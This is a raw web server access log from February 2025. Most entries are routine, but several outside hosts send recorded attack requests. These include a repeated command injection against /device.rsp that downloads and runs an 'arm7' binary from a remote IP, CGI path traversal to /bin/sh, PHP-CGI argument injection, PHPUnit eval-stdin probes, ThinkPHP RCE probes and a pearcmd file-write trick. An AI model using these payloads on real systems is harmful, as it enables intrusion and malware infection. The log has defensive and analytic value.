127.0.0.1 - - [18/Feb/2025:22:55:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:55:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:55:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:55:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:55:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
46.19.143.10 - - [18/Feb/2025:22:59:20 +0300] "GET / HTTP/1.1" 200 66524
91.224.92.10 - - [18/Feb/2025:23:03:37 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [18/Feb/2025:23:04:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:04:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:04:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:23:04:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:23:05:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:23:05:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:23:05:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:05:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:05:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:23:05:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:05:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:05:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:05:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:05:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:05:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:23:05:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:23:05:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:05:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:05:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:05:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:05:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:23:05:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
91.224.92.10 - - [18/Feb/2025:23:07:56 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
91.224.92.10 - - [18/Feb/2025:23:11:51 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [18/Feb/2025:23:14:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:14:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:23:14:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:14:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
91.224.92.10 - - [18/Feb/2025:23:15:12 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [18/Feb/2025:23:15:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:15:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:15:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:15:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:15:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:15:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:23:15:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:15:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:15:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:15:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:15:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:15:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:15:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:15:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:15:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:15:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:15:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:23:15:56 +0300] "\x16\x03\x01\x07" 400 226
91.224.92.10 - - [18/Feb/2025:23:23:44 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [18/Feb/2025:23:24:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:23:24:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:24:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:23:24:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:24:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:24:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:25:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:25:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:25:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:25:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:25:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:25:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:23:25:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:23:25:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:25:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:25:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:25:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:25:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:25:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:25:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:23:25:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:25:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
91.224.92.10 - - [18/Feb/2025:23:26:14 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
92.246.87.21 - - [18/Feb/2025:23:32:15 +0300] "GET / HTTP/1.1" 200 68491
91.224.92.10 - - [18/Feb/2025:23:32:50 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
208.110.70.42 - - [18/Feb/2025:23:33:57 +0300] "GET /restore.php HTTP/1.1" 404 196
127.0.0.1 - - [18/Feb/2025:23:34:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:34:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:23:34:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:34:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:35:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:35:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:23:35:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:35:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:23:35:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:35:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:23:35:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:23:35:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:35:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:35:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:35:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:35:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:35:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:35:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:35:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:35:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:35:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:35:56 +0300] "\x16\x03\x01\x07" 400 226
91.224.92.10 - - [18/Feb/2025:23:36:29 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
91.224.92.10 - - [18/Feb/2025:23:39:13 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
193.68.89.10 - - [18/Feb/2025:23:41:18 +0300] "GET / HTTP/1.1" 200 68491
127.0.0.1 - - [18/Feb/2025:23:44:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:44:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:45:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:45:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:45:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:45:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:23:45:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:45:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:45:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:45:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:45:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:45:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:45:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:45:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:23:45:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:45:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:45:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:23:45:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:45:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:23:45:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:45:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:45:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
91.224.92.10 - - [18/Feb/2025:23:47:41 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
91.224.92.10 - - [18/Feb/2025:23:50:06 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [18/Feb/2025:23:54:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:54:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:54:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:23:54:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
91.224.92.10 - - [18/Feb/2025:23:55:44 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [18/Feb/2025:23:55:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:55:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:55:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:23:55:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:23:55:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:55:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:55:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:55:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:55:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:55:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:23:55:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:55:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:23:55:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:55:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:55:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:55:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:55:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:23:55:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
46.19.143.10 - - [18/Feb/2025:23:56:36 +0300] "GET / HTTP/1.1" 200 66524
103.83.87.80 - - [18/Feb/2025:23:57:10 +0300] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 226
103.83.87.80 - - [18/Feb/2025:23:57:10 +0300] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 226
103.83.87.80 - - [18/Feb/2025:23:57:10 +0300] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:10 +0300] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:11 +0300] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:11 +0300] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:11 +0300] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:11 +0300] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:11 +0300] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:11 +0300] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:11 +0300] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:12 +0300] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:12 +0300] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:12 +0300] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:12 +0300] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:12 +0300] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:12 +0300] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:12 +0300] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:12 +0300] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:13 +0300] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:13 +0300] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:13 +0300] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:13 +0300] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:13 +0300] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:13 +0300] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:13 +0300] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:13 +0300] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:14 +0300] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:14 +0300] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:14 +0300] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:14 +0300] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:14 +0300] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:14 +0300] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:14 +0300] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:14 +0300] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:15 +0300] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:15 +0300] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:15 +0300] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:15 +0300] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:15 +0300] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:15 +0300] "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 200 68452
103.83.87.80 - - [18/Feb/2025:23:57:16 +0300] "GET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 196
103.83.87.80 - - [18/Feb/2025:23:57:16 +0300] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php HTTP/1.1" 200 68553
103.83.87.80 - - [18/Feb/2025:23:57:16 +0300] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 200 67621
103.83.87.80 - - [18/Feb/2025:23:57:16 +0300] "GET /containers/json HTTP/1.1" 404 196
91.224.92.10 - - [19/Feb/2025:00:02:34 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [19/Feb/2025:00:04:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:00:04:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:00:04:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:00:04:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
